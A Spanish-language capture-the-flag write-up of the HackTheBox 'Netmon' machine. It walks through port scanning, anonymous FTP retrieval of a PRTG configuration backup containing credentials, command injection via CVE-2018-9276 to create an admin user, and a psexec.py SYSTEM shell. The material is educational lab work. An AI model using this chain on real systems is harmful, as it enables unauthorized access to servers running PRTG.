---
title: HTB - Netmon
published: true
categories: [Windows]
tags: [eJPT, OSCP, eWPT, Fácil]
---

<img src="/assets/HTB/Netmon/netmon.png">

¡Hola!
Vamos a resolver de la máquina `Netmon` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **FTP Enumeration**
- **Information Leakage**
- **Abusing PRTG Network Monitor - Command Injection [RCE]**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Netmon`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.152
PING 10.10.10.152 (10.10.10.152) 56(84) bytes of data.
64 bytes from 10.10.10.15: icmp_seq=1 ttl=127 time=42.3 ms

--- 10.10.10.152 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Windows** debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```java
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.152 -oG allPorts

PORT   STATE SERVICE REASON
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```java
nmap -sCV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49669 10.10.10.152 -oN targeted

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-11-22T11:37:23
|_  start_date: 2022-11-22T11:31:34
```

### Reconocimiento FTP

Observamos que podemos conectarnos al servicio FTP como `anonymous`. Accedemos a la flag de usuario localizada en `Users/Public`

```java
❯ ftp 10.129.251.179
Connected to 10.129.251.179.
220 Microsoft FTP Service
Name (10.129.251.179:yorch): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-02-19  11:18PM                 1024 .rnd
02-25-19  09:15PM       <DIR>          inetpub
07-16-16  08:18AM       <DIR>          PerfLogs
02-25-19  09:56PM       <DIR>          Program Files
02-02-19  11:28PM       <DIR>          Program Files (x86)
02-03-19  07:08AM       <DIR>          Users
02-25-19  10:49PM       <DIR>          Windows
226 Transfer complete.
ftp> cd users
250 CWD command successful.
ftp> cd Public
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  07:05AM       <DIR>          Documents
07-16-16  08:18AM       <DIR>          Downloads
07-16-16  08:18AM       <DIR>          Music
07-16-16  08:18AM       <DIR>          Pictures
11-22-22  06:32AM                   34 user.txt
07-16-16  08:18AM       <DIR>          Videos
226 Transfer complete.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
34 bytes received in 0.04 secs (0.9321 kB/s)
ftp> exit
421 Service not available, remote server has closed connection
❯ cat user.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: user.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 1274a3caa2e8d8a75***************
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Seguimos con el reconocimiento FTP y examinamos los programas instalados en `Program Files (x86)` donde localizamos `PRTG Network Monitor` el cual habíamos visto en el reconocimiento de los servicios de los puertos abiertos

```java
ftp> cd "Program Files (x86)"
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
07-16-16  08:18AM       <DIR>          Common Files
07-16-16  08:18AM       <DIR>          internet explorer
07-16-16  08:18AM       <DIR>          Microsoft.NET
11-22-22  06:31AM       <DIR>          PRTG Network Monitor
11-20-16  08:53PM       <DIR>          Windows Defender
07-16-16  08:18AM       <DIR>          WindowsPowerShell
226 Transfer complete.
```

Una rápida búsqueda en Google nos revela que los archivos de configuración de PRTG se guardan en `C:\ProgramData\Paessler`

```java
ftp> cd Paessler
250 CWD command successful.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
11-22-22  06:35AM       <DIR>          PRTG Network Monitor
226 Transfer complete.
ftp> cd "PRTG Network monitor"
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
12-15-21  07:23AM       <DIR>          Configuration Auto-Backups
11-22-22  06:32AM       <DIR>          Log Database
02-02-19  11:18PM       <DIR>          Logs (Debug)
02-02-19  11:18PM       <DIR>          Logs (Sensors)
02-02-19  11:18PM       <DIR>          Logs (System)
11-22-22  06:32AM       <DIR>          Logs (Web Server)
11-22-22  06:33AM       <DIR>          Monitoring Database
02-25-19  09:54PM              1189697 PRTG Configuration.dat
12-15-21  10:31AM              1188552 PRTG Configuration.old
07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
11-22-22  06:35AM              1645790 PRTG Graph Data Cache.dat
02-25-19  10:00PM       <DIR>          Report PDFs
02-02-19  11:18PM       <DIR>          System Information Database
02-02-19  11:40PM       <DIR>          Ticket Database
02-02-19  11:18PM       <DIR>          ToDo Database
226 Transfer complete.
```

Encontramos un archivo `Configuration.old.bak`. Procedemos a descargar e inspeccionar su contenido con el comando `get`

```java
ftp> get "PRTG Configuration.old.bak"
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1153755 bytes received in 0.49 secs (2.2236 MB/s)
```


<img src="/assets/HTB/Netmon/creds.png">


### Reconocimiento Web

* * *

Accedemos al servicio web por el puerto 80 dónde nos encontramos con un panel de login de `PRTG Network Monitor`


<img src="/assets/HTB/Netmon/web.png">


Tratamos de accecer con las credenciales que encontramos en el archivo backup pero no podemos. Aplicando un poco de guessing y pensando que esta máquina fué lanzada en 2019 probamos misma contraseña pero con fecha 2019 y conseguimos acceder


<img src="/assets/HTB/Netmon/controlpanel.png">


Explorando la web localizamos la versión de PRTG Network Monitor


<img src="/assets/HTB/Netmon/bersion.png">


Una búsqueda en Google nos revela que versiones inferiores a 18.1.39 son vulnerables a `CVE-2018-9276`

De acuerdo a este [link](https://www.codewatch.org/blog/?p=453) podemos llegar a un RCE a través del sistema de notificaciones

Accedemos a Setup > Account Settings > Notifications > Add New Notification

Añadimos en el campo `Parameter` el comando para agregar nuevo usuario en grupo `administrators`


<img src="/assets/HTB/Netmon/notification.png">


Salvamos y para iniciar el proceso hay que clickar en el icono de la campana de la notificación que hemos creado


<img src="/assets/HTB/Netmon/bell.png">


Una vez realizada esta acción nos podemos conectar con la máquina víctima con el usuario que hemos creado con privilegios de administrador con la herramienta `psexec.py` de la suite de `Impacket`

```java
❯ /usr/share/doc/python3-impacket/examples/psexec.py htb:'abc123!'@10.10.10.152
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file rEQjkSxI.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service gBIc on 10.10.10.152.....
[*] Starting service gBIc.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

### Flags

* * *

Tras una búsqueda desde la raíz localizamos las flags en sus respectivos directorios. Con el comando `type` nos muestra el contenido.

```bash
#ROOT
C:\>dir /b/s root.txt
C:\Users\Administrator\Desktop\root.txt

C:\>type C:\Users\Administrator\Desktop\root.txt
db430636922de1d0***************
```

Hemos completado la máquina **Netmon** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/Netmon/pwned.png">
